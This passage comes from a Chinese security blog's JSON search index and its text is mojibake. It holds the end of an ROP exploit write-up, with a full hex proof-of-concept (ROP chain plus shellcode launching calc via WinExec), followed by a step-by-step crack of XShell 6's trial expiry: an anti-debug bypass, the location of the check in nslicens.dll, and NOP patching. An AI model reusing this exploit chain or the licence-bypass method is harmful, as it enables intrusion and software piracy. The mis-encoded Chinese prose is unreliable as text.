; esi\u003eedi, æ‰€ä»¥ä¸ä¼šè·³è½¬ 00401684 | 5F | pop edi 00401685 | 5E | pop esi 00401686 | C3 | ret ; è·³åˆ°ä¸‹ä¸€ä¸ªæ„é€ å¥½çš„ROPé“¾ è¿™é‡Œéœ€è¦è¯´æ˜ä¸€ç‚¹çš„æ˜¯ï¼ŒVirtualProtectçš„å‚æ•°é—®é¢˜ï¼Œå‚æ•°1å’Œå‚æ•°4éœ€è¦æ ¹æ®è‡ªå·±ç³»ç»Ÿä¸Šçš„æ ˆç©ºé—´æ¥æ„é€  ","date":"2019-06-02","objectID":"/2019/06/first-rop/:5:5","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"5.6 è·³è½¬åˆ°æ ˆç©ºé—´ æ‰§è¡Œäº†VirtualProtectä¹‹åï¼Œå°±éœ€è¦è·³è½¬åˆ°æ ˆç©ºé—´å»æ‰§è¡ŒShellCodeäº†ï¼Œæ„é€ äº†è¿™ä¸ªæ ˆåœ°å€ä¹‹åROPé“¾ä¹Ÿå°±åˆ°è¿™å°±ç»“æŸäº†ï¼Œå…¶ä½™çš„å°±æ˜¯ShellCodeäº†ã€‚è€Œè¿™ä¸ªæ ˆç©ºé—´åœ°å€ä¹Ÿéœ€è¦æ ¹æ®è‡ªå·±æ„é€ çš„ROPé“¾å’Œç³»ç»Ÿæ¥å†³å®š ROPå€¼ è¯´æ˜ A8FF1200 æœ€åä¸€ä¸ªRETåœ°å€ï¼Œæ‰§è¡ŒShellCodeçš„åœ°å€ ","date":"2019-06-02","objectID":"/2019/06/first-rop/:5:6","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"6. æœ€ç»ˆçš„ Poc // å¡«å……ç‰© 313233343132333431323334313233343132333431323334313233343132330090909090 // ROPé“¾ 7F154000 F81F4000 00000000 84164000 00000000 80A0FFFF 9B134000 00000000 00000000 00000000 00000000 59144000 84164000 00000000 00000000 7B164000 FCFF1200 01000000 40000000 FCFF1200 00000000 00000000 A8FF1200 // ShellCode A100204000 // mov eax,[0x402000] è·å–å¯¼å…¥è¡¨å‡½æ•°åœ°å€ 056A360400 // add eax,4366A é€šè¿‡åç§»æ‰¾åˆ°WinExec()å‡½æ•°ï¼Œè¿™ä¸ªåç§»éœ€è¦æ ¹æ®ç³»ç»Ÿè€Œå†³å®š EB14 // jmp 12FFC8 è·³è½¬åˆ°ä¸‹æ–¹å»æ‰§è¡Œï¼Œè¿™é‡Œçš„åç§»æ ¹æ®å‚æ•°ä¸åŒéœ€è¦æ”¹å˜ 636D642E657865202F632063616C632E65786500 // \"cmd.exe /c calc.exe\"å­—ç¬¦ä¸²ï¼ŒWinExec()çš„å‚æ•° 6A00 // push 0 WinExec()å‚æ•°1 68B4FF1200 // push 12FFB4 WinExec()å‚æ•°2ï¼Œè¿™é‡Œçš„å‚æ•°åœ°å€éœ€è¦æ ¹æ®å‚æ•°æ”¹å˜ FFD0 // call eax æ‰§è¡ŒWinExec() // å®Œæ•´çš„Poc 3132333431323334313233343132333431323334313233343132333431323300909090907F154000F81F400000000000841640000000000080A0FFFF9B13400000000000000000000000000000000000591440008416400000000000000000007B164000FCFF12000100000040000000FCFF12000000000000000000A8FF1200A100204000056A360400EB14636D642E657865202F632063616C632E657865006A0068B4FF1200FFD0 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:6:0","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"7. æ‰§è¡Œæ•ˆæœ è¿™ä¸ªPocåœ¨å½“å‰ç³»ç»Ÿç‰ˆæœ¬ä¸Šæ˜¯é€šæ€çš„ï¼Œæ— è®ºé‡å¯è¿˜æ˜¯æ€ä¹ˆæ ·ï¼Œéƒ½èƒ½å®ç°ç²¾å‡†æº¢å‡ºå¹¶æ‰§è¡Œ æ‰§è¡Œæ•ˆæœ\" æ‰§è¡Œæ•ˆæœ ","date":"2019-06-02","objectID":"/2019/06/first-rop/:7:0","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"8. END è¿™æ¬¡å®éªŒï¼Œæ˜¯æŠŠä»¥å‰çœ‹è¿‡ROPèµ„æ–™ç»™å®é™…è¿ç”¨èµ·æ¥äº†ï¼Œè€Œä¸”æ˜¯æ‰‹åŠ¨å¯»æ‰¾çš„ROPé“¾ï¼Œç®—æ˜¯ç†è®º+å®è·µç»“åˆäº†ï¼Œæ”¶è·å¾ˆå¤§ã€‚ è¿™æ¬¡å®è·µä¸­ï¼Œè¿˜æ˜¯é‡åˆ°äº†è€é—®é¢˜ï¼Œæ€è·¯ä¸å¤Ÿå¼€é˜”ã€‚è·å–VirtualProtectåœ°å€æ—¶ï¼Œå½“æ²¡æœ‰å¯¼å…¥è¡¨å’ŒFSå¯„å­˜å™¨çš„æ—¶å€™ï¼Œæˆ‘çš„ç¡®æ‰¾ä¸åˆ°å…¶ä»–åŠæ³•çªç ´äº†ï¼Œè¦æ˜¯æ²¡æœ‰ @æ¢¦è½©è€å“¥ çš„å¸®åŠ©ï¼Œå¯èƒ½ä¹Ÿæ„é€ ä¸å‡ºç‰ˆæœ¬é€šæ€çš„Pocï¼Œéå¸¸æ„Ÿè°¢ @æ¢¦è½©è€å“¥ çš„å¸®åŠ©ã€‚ ","date":"2019-06-02","objectID":"/2019/06/first-rop/:8:0","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"ä¸šç•Œæœ€å¼ºå¤§çš„SSHå®¢æˆ·æœº","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/","tags":["é€†å‘","ç ´è§£"],"title":"XShell 6è¯„ä¼°ç‰ˆé€†å‘åˆ†æ","uri":"/2019/05/xshell-6-analysis/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":" ä¿¡æ¯ æœ¬ç¯‡æ–‡ç« åªåšæŠ€æœ¯åˆ†äº«ï¼Œä¸æä¾›ç ´è§£ç‰ˆæœ¬ä¸‹è½½ï¼ ","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/:0:0","tags":["é€†å‘","ç ´è§£"],"title":"XShell 6è¯„ä¼°ç‰ˆé€†å‘åˆ†æ","uri":"/2019/05/xshell-6-analysis/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"1. å¼•è¨€ XShellä½œä¸ºä¸€ä¸ªå¼ºå¤§çš„SSHè¿æ¥å·¥å…·ï¼Œä¸€ç›´æ·±å—æˆ‘å–œçˆ±ã€‚æŸå¤©ï¼Œæˆ‘çªç„¶å‘ç°è‡ªå·±çš„XShellä¸èƒ½ç”¨äº†ï¼Œå°±åƒä¸‹é¢è¿™æ ·ï¼š åˆ°æœŸçª—å£\" åˆ°æœŸçª—å£ XShellåˆ†ä¸ºä¸ªäººç‰ˆå’Œä¼ä¸šç‰ˆï¼Œä¸ªäººç‰ˆæ˜¯æ°¸ä¹…å…è´¹çš„ï¼Œè€Œä¼ä¸šç‰ˆåˆ™éœ€è¦è´­ä¹°ã€‚ä¸ªäººç‰ˆä¸ä¼ä¸šç‰ˆçš„åŒºåˆ«åœ¨äºï¼šä¸ªäººç‰ˆçš„çª—å£æ ‡ç­¾é¡µè¢«é™åˆ¶ä¸º4ä¸ªï¼Œå…¶ä½™çš„ä¸ä¼ä¸šç‰ˆå·®åˆ«ä¸å¤§ã€‚è€Œæˆ‘å½“æ—¶ä¸çŸ¥é“æœ‰ä¸ªäººç‰ˆï¼Œä¸€ç›´ç”¨çš„éƒ½æ˜¯è¯„ä¼°ç‰ˆï¼Œè¯„ä¼°ç‰ˆæ˜¯æœ‰æœŸé™çš„ï¼Œåªèƒ½ç”¨31å¤©ï¼Œäºæ˜¯å°±è¯ç”Ÿäº†è¿™ç¯‡æ–‡ç« ã€‚ ","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/:1:0","tags":["é€†å‘","ç ´è§£"],"title":"XShell 6è¯„ä¼°ç‰ˆé€†å‘åˆ†æ","uri":"/2019/05/xshell-6-analysis/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2. æµ‹è¯•ç¯å¢ƒå’Œå·¥å…· æµ‹è¯•ç¯å¢ƒï¼š Windows7 32ä½ ä½¿ç”¨å·¥å…·ï¼š OllyDbgã€ç«ç»’å‰‘ã€010Editorã€Resource Hackerã€IDA Proç­‰ç­‰ ","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/:2:0","tags":["é€†å‘","ç ´è§£"],"title":"XShell 6è¯„ä¼°ç‰ˆé€†å‘åˆ†æ","uri":"/2019/05/xshell-6-analysis/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"3. åˆæ­¥çŒœæµ‹åˆ†æ é€†å‘ä¸€ä¸ªè½¯ä»¶ä¹‹å‰ï¼Œéœ€è¦å…ˆçŒœæµ‹éœ€è¦é€†å‘çš„åŠŸèƒ½æ˜¯å¦‚ä½•å†™å‡ºæ¥çš„ï¼Œè¿™æ ·åœ¨é€†å‘çš„æ—¶å€™å°†ä¼šäº‹åŠåŠŸå€ã€‚è¿™ä¸ªè½¯ä»¶æˆ‘çš„çŒœæµ‹æ˜¯è¿™æ ·çš„ï¼š åˆ›å»ºçª—å£/å¯¹è¯æ¡†ï¼šè¿™ä¸ªæ˜¯è‚¯å®šçš„ï¼Œæ¯•ç«Ÿä¹Ÿæœ‰ä¸ªåˆ°æœŸçª—å£å˜› æ£€æŸ¥äº†æ—¶é—´ï¼šè¿™é‡Œå°±ä¸ç¡®å®šæ˜¯æœ¬åœ°æ£€æŸ¥è¿˜æ˜¯è”ç½‘æ£€æŸ¥ï¼Œéœ€è¦è¿›ä¸€æ­¥åˆ†æ è®¾ç½®çª—å£æ ‡é¢˜ï¼šè¿™ä¸ªå¯èƒ½ä¼šè®¾ç½®ï¼Œä¹Ÿå¯èƒ½å¯¹è¯æ¡†æœ¬èº«è‡ªå·±å°±æœ‰åç§° ç¨‹åºæ˜¯å¦æœ‰åè°ƒè¯•/åŠ å£³ï¼šè¿™ä¸ªéœ€è¦ç¬¬ä¸€æ—¶é—´æ£€æŸ¥ ","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/:3:0","tags":["é€†å‘","ç ´è§£"],"title":"XShell 6è¯„ä¼°ç‰ˆé€†å‘åˆ†æ","uri":"/2019/05/xshell-6-analysis/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"4. æ­£å¼åˆ†æ æ ¹æ®ä»¥ä¸Šçš„çŒœæµ‹ï¼Œå¼€å§‹è¿›è¡Œæ­£å¼åˆ†æã€‚ ","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/:4:0","tags":["é€†å‘","ç ´è§£"],"title":"XShell 6è¯„ä¼°ç‰ˆé€†å‘åˆ†æ","uri":"/2019/05/xshell-6-analysis/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"4.1 æ£€æŸ¥ç¨‹åºæ˜¯å¦å­˜åœ¨åè°ƒè¯•/åŠ å£³ ç¬¬ä¸€ä»¶äº‹å°±æ˜¯æ£€æŸ¥ç¨‹åºæ˜¯å¦æœ‰åŠ å£³ã€æ˜¯å¦å­˜åœ¨åè°ƒè¯•ï¼Œè¿™æ ·æ‰æœ‰ç»§ç»­ä¸‹å»çš„å¯èƒ½æ€§ã€‚ æ£€æŸ¥æ˜¯å¦è¢«åŠ å£³ï¼š PEiDæŸ¥çœ‹ä¸»ç¨‹åº PEiDæŸ¥å£³\" PEiDæŸ¥å£³ ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼Œèƒ½è¯†åˆ«å‡ºæ¥æ˜¯VC6.0ç¼–è¯‘çš„(ä½†æ˜¯é“¾æ¥å™¨ç‰ˆæœ¬æ˜¯11.0,å¯èƒ½æ˜¯VS2012ç¼–è¯‘çš„ï¼Œæ¯•ç«ŸVCä¹Ÿå¤ªè€äº†ç‚¹)ï¼Œè€Œä¸”åŒºæ®µå¾ˆæ­£å¸¸ï¼Œå¾ˆæ˜æ˜¾æ²¡æœ‰åŠ å£³ æ£€æŸ¥æ˜¯å¦æœ‰åè°ƒè¯•ï¼š ç”¨æ— æ’ä»¶çš„ODå’Œx64Dbgæ‰“å¼€ç¨‹åº æ£€æŸ¥åè°ƒè¯•\" æ£€æŸ¥åè°ƒè¯• è¿™é‡Œç”¨æ— æ’ä»¶ODå’Œx64Dbgéƒ½èƒ½å‘ç°ç¨‹åºå­˜åœ¨åè°ƒè¯•ï¼Œè™½ç„¶ç”¨å¾çˆ±ç ´è§£ODå¯ä»¥ååè°ƒè¯•ï¼Œä¸è¿‡è¿™é‡ŒæŠ±ç€å­¦ä¹ çš„æ€åº¦ï¼Œæ¥æ‰¾æ‰¾è¿™ä¸ªåè°ƒè¯•ï¼š é¦–å…ˆåœ¨å…³é”®APIä¸Šä¸‹æ–­ï¼Œæˆ‘è¿™é‡Œå…ˆåœ¨IsDebuggerPresentä¸‹æ–­ï¼Œå‘ç°æ˜¯å¯ä»¥æ–­ä¸‹æ¥çš„ï¼š æ–­ç‚¹åœ¨IsDebuggerPresent\" æ–­ç‚¹åœ¨IsDebuggerPresent æ¥ä¸‹æ¥è®©ç¨‹åºè·‘èµ·æ¥å¯ä»¥å‘ç°ï¼ŒIsDebuggerPresentè¿™ä¸ªå‡½æ•°è¢«æ‰§è¡Œäº†å¾ˆå¤šæ¬¡ï¼Œéœ€è¦æ‰¾åˆ°å…³é”®çš„ä½ç½®ï¼Œè¿™é‡Œçš„æ€è·¯æ˜¯åœ¨ExitProcesså‡½æ•°ä¸‹æ–­ï¼Œç„¶åæ ˆå›æº¯ï¼š æ–­ç‚¹åœ¨ExitProcess\" æ–­ç‚¹åœ¨ExitProcess è¿™é‡Œç¨‹åºæ˜¯åœ¨RtlExitUserProcesså‡½æ•°æ–­ä¸‹æ¥çš„ï¼Œéœ€è¦æ³¨æ„ï¼ï¼ï¼ é€šè¿‡åˆ†æRtlExitUserProcessçš„æ ˆå›æº¯ï¼Œæ‰¾åˆ°äº†æ‰§è¡Œå…³é”®å‡½æ•°çš„åœ°æ–¹ï¼Œæ˜¯åœ¨NsActivate_libFNP.dllè¿™ä¸ªæ¨¡å—ä¸­ï¼Œå¦‚ä¸‹å›¾ï¼š æ ˆå›æº¯ExitProcess\" æ ˆå›æº¯ExitProcess ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼šæ‰§è¡ŒRtlExitUserProcessçš„å…³é”®å‡½æ•°æ˜¯0x66811264è¿™ä¸ªå‡½æ•°ï¼Œè€Œæ‰§è¡Œ0x66811264è¿™ä¸ªå‡½æ•°çš„åœ°å€æ˜¯0x6683C342 æ—¢ç„¶æ‰¾åˆ°äº†å…³é”®åœ°å€ï¼Œé‚£ä¹ˆå°±æ¥åˆ†æè¿™ä¸ªåœ°å€é™„è¿‘çš„å†…å®¹ï¼Œåˆ†æå¦‚ä¸‹ï¼š å…³é”®ä½ç½®åˆ†æ\" å…³é”®ä½ç½®åˆ†æ å…³é”®å°±æ˜¯EAXä¸ESIå¿…é¡»ç›¸ç­‰ï¼Œå¦åˆ™å°±é€€å‡ºç¨‹åº æˆ‘è¿™é‡Œçš„ç›®çš„åªæ˜¯ä¸ºäº†è®©ç¨‹åºä¸é€€å‡ºï¼Œæ–¹ä¾¿è°ƒè¯•ï¼Œæ‰€ä»¥æˆ‘æ²¡æœ‰å»å…·ä½“åˆ†æESIçš„å€¼æ€ä¹ˆæ¥çš„ç­‰ç­‰ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªè¡Œå»åˆ†æä¸€æ³¢ã€‚æˆ‘è¿™é‡Œå°†CALL EAXå‡½æ•°ä¸­çš„å†…å®¹ç»™æ”¹äº†ï¼Œä½¿EAX = ESIï¼Œç„¶åDumpä¹‹åæ›¿æ¢æ–‡ä»¶å°±å¯ä»¥è¿‡æ‰åè°ƒè¯•äº†ï¼Œä¿®æ”¹å¦‚ä¸‹ï¼š ä¿®æ”¹æ–‡ä»¶ï¼Œè¿‡æ‰åè°ƒè¯•\" ä¿®æ”¹æ–‡ä»¶ï¼Œè¿‡æ‰åè°ƒè¯• è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ç‚¹ï¼šå½“æ›¿æ¢äº†æ–‡ä»¶ä¹‹åï¼Œè¿è¡Œç¨‹åºå¯èƒ½ä¼šæŠ¥å¦‚ä¸‹é”™è¯¯ï¼Œè¿™é‡Œå¹¶ä¸å½±å“ç¨‹åºæ‰§è¡Œæµç¨‹ï¼Œæ‰€ä»¥å¯ä»¥å¿½ç•¥ \" è¿™é‡Œè¦è¯´æ˜ä¸€ä¸‹çš„æ˜¯ï¼Œç”¨å¾çˆ±ç ´è§£ODæ˜¯å¯ä»¥ç›´æ¥è¿‡æ‰è¿™ä¸ªåè°ƒè¯•çš„ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘éƒ½æ˜¯ä½¿ç”¨çš„å¾çˆ±ç ´è§£OD ","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/:4:1","tags":["é€†å‘","ç ´è§£"],"title":"XShell 6è¯„ä¼°ç‰ˆé€†å‘åˆ†æ","uri":"/2019/05/xshell-6-analysis/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"4.2 åˆ†æåˆ›å»ºçª—å£/å¯¹è¯æ¡† è¿‡æ‰åè°ƒè¯•ä¹‹åï¼Œå°±å¯ä»¥æ­£å¼å¼€å§‹åˆ†æç¨‹åºäº†ã€‚ é€†å‘ç ´è§£è½¯ä»¶ï¼Œä»èƒ½çœ‹è§çš„çª—å£å…¥æ‰‹ï¼Œç„¶åå¾€å›æ¨æ˜¯æœ€å¿«çš„æ–¹æ³•ã€‚ é¦–å…ˆåœ¨æ‰€æœ‰åˆ›å»ºçª—å£/å¯¹è¯æ¡†çš„APIä¸Šä¸‹æ–­ï¼Œæ–­ä¸‹æ¥ä¹‹åè§‚å¯Ÿæ ˆä¼ é€’çš„å‚æ•°ï¼Œä¾‹å¦‚ä¸‹é¢è¿™æ ·ï¼š çª—å£ä¼ é€’çš„å‚æ•°\" çª—å£ä¼ é€’çš„å‚æ•° å¯ä»¥é€šè¿‡è§‚å¯Ÿçª—å£çš„ç±»åã€åç§°å’Œå›è°ƒå‡½æ•°æ¥ç¡®å®šæ˜¯ä¸æ˜¯è¦å¯»æ‰¾çš„çª—å£ã€‚ä½†åœ¨è¿™é‡Œï¼Œå¦‚æœä½ ä½¿ç”¨çš„æ˜¯å¾çˆ±ç ´è§£ODçš„æ’ä»¶è®¾ç½®çš„APIæ–­ç‚¹çš„è¯ï¼Œé‚£åŸºæœ¬ä¸Šæ˜¯æ‰¾ä¸åˆ°åˆ°æœŸçª—å£æ˜¯åœ¨å“ªé‡Œè¢«åˆ›å»ºçš„ã€‚å› ä¸ºå¾çˆ±ç ´è§£ODçš„è¿™ä¸ªæ’ä»¶æ˜¯è¿™æ ·çš„ï¼š APIæ–­ç‚¹å·¥å…·\" APIæ–­ç‚¹å·¥å…· è¿™ä¸ªæ’ä»¶å¯ä»¥å¿«æ·çš„è®¾ç½®APIæ–­ç‚¹ï¼Œä½†è¿™é‡Œä½ æŠŠæ‰€æœ‰çš„åˆ›å»ºçª—å£/å¯¹è¯æ¡†çš„APIéƒ½å‹¾ä¸Šç¡®å®šä¹‹åï¼Œçš„ç¡®å¾ˆå¤šAPIä¸Šéƒ½èƒ½è¢«è®¾ç½®ä¸Šæ–­ç‚¹ï¼Œå¯å”¯ç‹¬DialogBoxIndirectParam(A/W)è¿™ä¸ªAPIæ²¡æœ‰è®¾ç½®ä¸Šæ–­ç‚¹ï¼Œè€Œæ°æ°è¿™ä¸ªåˆ°æœŸçª—å£å°±æ˜¯ä½¿ç”¨è¿™ä¸ªAPIåˆ›å»ºçš„å¯¹è¯æ¡†(ä¸è¦é—®æˆ‘ä¸ºä»€ä¹ˆçŸ¥é“ï¼Œæˆ‘ä¹Ÿæ˜¯è°ƒè¯•äº†å¾ˆä¹…æ‰æ‰¾åˆ°è¿™ä¸ªåŸå› çš„)ï¼Œæ‰€ä»¥è¿˜æ˜¯æ‰‹åŠ¨è®¾ç½®è¿™äº›APIçš„æ–­ç‚¹å§ã€‚ è¿™é‡Œä»¥DialogBoxIndirectParam(A/W)è¢«è®¾ç½®ä¸Šæ–­ç‚¹ä¸ºåŸºç¡€ï¼Œå‘ç°è¢«è°ƒç”¨äº†ä¸€æ¬¡ä¹‹åï¼Œåˆ°æœŸçª—å£æ˜¾ç¤ºå‡ºæ¥ï¼Œé‚£ä¹ˆå¯ä»¥æ€€ç–‘è¿™æ¬¡è°ƒç”¨å°±æ˜¯åˆ›å»ºåˆ°æœŸçª—å£ï¼Œé‚£ä¹ˆå¯ä»¥è¯¦ç»†åˆ†æï¼Œå…ˆè§‚å¯Ÿå…¶è°ƒç”¨æ—¶å‚æ•°ï¼š DialogBoxIndirectParamW\" DialogBoxIndirectParamW å¯¹è¯æ¡†çš„åç§°å’Œç±»éƒ½æ˜¯çœ‹ä¸åˆ°çš„ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå¯¹è¯æ¡†çš„å›è°ƒå‡½æ•°10001C60ï¼Œè¿™é‡Œå¯ä»¥è·Ÿè¿›å»çœ‹çœ‹ï¼Œå°±èƒ½å‘ç°è¿™ä¸ªå›è°ƒå‡½æ•°å°±æ˜¯åˆ°æœŸçª—å£çš„å›è°ƒå‡½æ•°ï¼Œåœ¨è¿™ä¸ªçª—å£ä¸­è®¾ç½®äº†çª—å£çš„æ ‡é¢˜ï¼Œä¹Ÿå°±æ˜¯æœ€åˆçŒœæµ‹çš„ç¬¬ä¸‰ç‚¹ï¼Œé€šè¿‡åœ¨SetWindowTextA/Wä¸‹æ–­ç‚¹æœ‰æ—¶ä¹Ÿèƒ½æ‰¾åˆ°ä¸€äº›ä¸œè¥¿ï¼Œå¦‚ä¸‹ï¼š è®¾ç½®çª—å£æ ‡é¢˜\" è®¾ç½®çª—å£æ ‡é¢˜ æ—¢ç„¶æ‰¾åˆ°äº†å…³é”®åˆ›å»ºçª—å£çš„ä½ç½®ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ ˆå›æº¯ï¼Œæ‰¾åˆ°åˆ›å»ºçª—å£çš„ä½ç½®ï¼Œå¦‚ä¸‹ï¼š åˆ°æœŸçª—å£æ ˆå›æº¯\" åˆ°æœŸçª—å£æ ˆå›æº¯ é€šè¿‡åˆ†æï¼Œ10001000è¿™ä¸ªå‡½æ•°æ˜¯è°ƒç”¨DialogBoxIndirectParamWçš„ä¸»è¦å‡½æ•°ï¼Œè€Œè°ƒç”¨10001000å‡½æ•°çš„ä½ç½®æ˜¯10003F88ï¼Œä¹Ÿå°±æ˜¯è¯´10003F88æ‰æ˜¯å…³é”®éœ€è¦åˆ†æçš„ä½ç½®ï¼Œ10003F88æ‰€åœ¨ä½ç½®çš„ä»£ç å¦‚ä¸‹ï¼š å…³é”®ä½ç½®ä»£ç \" å…³é”®ä½ç½®ä»£ç  ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼Œ10003F88è¿™ä¸ªä½ç½®çš„æ‰§è¡Œæ˜¯ä»æŸä¸ªåœ°æ–¹è·³è½¬è¿‡æ¥çš„ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢æŸä¸ªä½ç½®è·³è½¬åˆ°äº†10003F6Eè¿™ä¸ªåœ°æ–¹ï¼Œç„¶åç´§æ¥ç€æ‰§è¡Œäº†10001000è¿™ä¸ªå‡½æ•°ï¼Œéšååˆ›å»ºäº†åˆ°æœŸçª—å£ã€‚é€šè¿‡ODå¯ä»¥æŸ¥çœ‹åˆ°æ˜¯å“ªé‡Œè·³è½¬åˆ°äº†10003F6Eè¿™é‡Œæ¥çš„ï¼Œå¦‚ä¸‹ï¼š å…³é”®åˆ¤æ–­ä½ç½®\" å…³é”®åˆ¤æ–­ä½ç½® ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼Œ10003F07å’Œ10003F21æ˜¯è·³è½¬çš„ä½ç½®ï¼Œå¯ä»¥ç›´æ¥ä¸‹æ–­ç‚¹åˆ°è¿™ä¸¤ä¸ªåœ°æ–¹ï¼Œç„¶åä¿®æ”¹å¯„å­˜å™¨çš„å€¼ï¼Œå°±å¯ä»¥æµ‹è¯•å‡ºï¼Œåªè¦10003F21ä¸è·³è½¬ï¼Œé‚£ä¹ˆå°±ä¸ä¼šæç¤ºåˆ°æœŸï¼Œç„¶åNOPæ‰è¿™é‡Œç¨‹åºä¹Ÿå°±ä¸ä¼šæç¤ºåˆ°æœŸäº†ï¼Œå°±åƒè¿™æ ·ï¼š NOPæ‰åˆ¤æ–­ä½ç½®\" NOPæ‰åˆ¤æ–­ä½ç½® å¯ä»¥çœ‹åˆ°å·²ç»ä¸ä¼šæç¤ºåˆ°æœŸäº†ï¼Œè¿™æ—¶å°±å¯ä»¥Dumpä¸‹æ¥ï¼Œç„¶åæ›¿æ¢æ–‡ä»¶å°±å®ç°äº†æ°¸ä¹…ä¸åˆ°æœŸçš„åŠŸèƒ½äº†ï¼Œè¿™é‡Œè°ƒç”¨çš„æ¨¡å—æ˜¯nslicensï¼Œæ‰€å¯¹åº”çš„æ¨¡å—æ˜¯XShellå®‰è£…ç›®å½•ä¸‹çš„nslicens.dllï¼š æŸ¥çœ‹æ¨¡å—ä½ç½®\" æŸ¥çœ‹æ¨¡å—ä½ç½® ä¸Šé¢æ˜¯åŠ¨æ€åˆ†æçš„ç»“æœï¼Œå…¶å®æ‰¾åˆ°å…³é”®ç‚¹ä¹‹åï¼Œé€šè¿‡IDAå¾ˆå¿«å°±èƒ½çœ‹å‡ºé€»è¾‘ï¼š IDAè§‚å¯Ÿå…³é”®ç‚¹é€»è¾‘\" IDAè§‚å¯Ÿå…³é”®ç‚¹é€»è¾‘ è€Œ10001000è¿™ä¸ªå‡½æ•°ä¸­æ˜¯è¿™æ ·çš„ï¼š IDAä¸­10001000å‡½æ•°\" IDAä¸­10001000å‡½æ•° å¯ä»¥çœ‹åˆ°èµ„æºIDä¸º103ï¼Œé€šè¿‡Resource HackeræŸ¥çœ‹èµ„æºï¼š ReHackeræŸ¥çœ‹èµ„æº\" ReHackeræŸ¥çœ‹èµ„æº ","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/:4:2","tags":["é€†å‘","ç ´è§£"],"title":"XShell 6è¯„ä¼°ç‰ˆé€†å‘åˆ†æ","uri":"/2019/05/xshell-6-analysis/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"4.3 é€šè¿‡æ—¶é—´åˆ†æ ä¸Šé¢æ˜¯åŸºäºçª—å£åˆ†æçš„ï¼Œæ˜¯æœ€å¿«çš„æ–¹æ³•ã€‚ä½†æ˜¯æˆ‘å› ä¸ºæœ€å¼€å§‹DialogBoxIndirectParamWæ²¡ä¸‹ä¸Šæ–­ç‚¹ï¼Œæ‰€ä»¥æˆ‘æ˜¯é€šè¿‡æ—¶é—´åˆ†ææ‰¾åˆ°å…³é”®ç‚¹çš„ã€‚ é¦–å…ˆè¦é€šè¿‡æ—¶é—´åˆ†æï¼Œéœ€è¦çŸ¥é“å®ƒæ˜¯åˆ¤æ–­çš„æœ¬åœ°æ—¶é—´è¿˜æ˜¯ç½‘ç»œæ—¶é—´ï¼Œå…ˆç”¨æœ¬åœ°æ—¶é—´åšåšæµ‹è¯•ï¼š ä¿®æ”¹æœ¬åœ°æ—¶é—´æµ‹è¯•\" ä¿®æ”¹æœ¬åœ°æ—¶é—´æµ‹è¯• å¯ä»¥çœ‹åˆ°çš„ç¡®æ˜¯åˆ¤æ–­çš„æœ¬åœ°æ—¶é—´ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœä¸è¿›è¡Œé€†å‘ï¼Œç›´æ¥ä¿®æ”¹æ—¶é—´ä¹Ÿèƒ½è¾¾åˆ°æ°¸ä¹…ä¸åˆ°æœŸçš„æ•ˆæœã€‚ æ¥ä¸‹æ¥å°±è¦åˆ†æå®ƒæ˜¯åœ¨å“ªåˆ¤æ–­çš„æ—¶é—´äº†ã€‚éœ€è¦åœ¨GetLocalTimeä¸‹æ–­ç‚¹ã€‚è¿™é‡Œæœ‰ä¸€ç‚¹å’Œä¸Šé¢æœ‰ç‚¹ç±»ä¼¼ï¼Œå°±æ˜¯ä¸åˆ›å»ºçª—å£/å¯¹è¯æ¡†çš„APIä¸€æ 